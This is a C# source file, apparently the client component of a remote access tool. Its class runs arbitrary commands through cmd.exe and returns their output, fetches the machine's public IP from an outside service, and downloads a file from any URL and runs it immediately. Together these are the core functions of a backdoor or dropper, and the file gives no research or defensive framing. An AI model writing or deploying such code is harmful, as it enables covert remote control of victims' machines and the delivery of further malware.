using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
namespace client
{
    class cmdMethods
    {
        
        public string command(string cmd)
        {
                        
                      System.Diagnostics.Process proc = new System.Diagnostics.Process(); 
                      proc.StartInfo.FileName = "cmd.exe";
                      proc.StartInfo.Arguments = cmd; 
                      proc.StartInfo.UseShellExecute = false;
                      proc.StartInfo.RedirectStandardOutput = true; 
                     proc.Start();
            string output = proc.StandardOutput.ReadToEnd();
            return output;
        }
        public string getIp()
        {
            String direction = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                direction = stream.ReadToEnd();
            }

            //Search for the ip in the html
            int first = direction.IndexOf("Address: ") + 9;
            int last = direction.LastIndexOf("</body>");
            direction = direction.Substring(first, last - first);

            return direction;
           
        }
        public void downloadrun(string url)
        {
            using (WebClient Client = new WebClient())
            {
                string filename = "test.txt";
                Uri u = new Uri(url);           
                filename =  Path.GetFileName(u.AbsolutePath);
                FileInfo file = new FileInfo(filename);

                try
                {
                    Client.DownloadFile(url, file.FullName);
                }
                catch (System.Net.WebException)
                {
                //file not found

                }
                //Console.WriteLine("downloading..");

                Process.Start(file.FullName);
                //Console.WriteLine("executing" + Convert.ToString(file.FullName));
            }
        }
    }
}
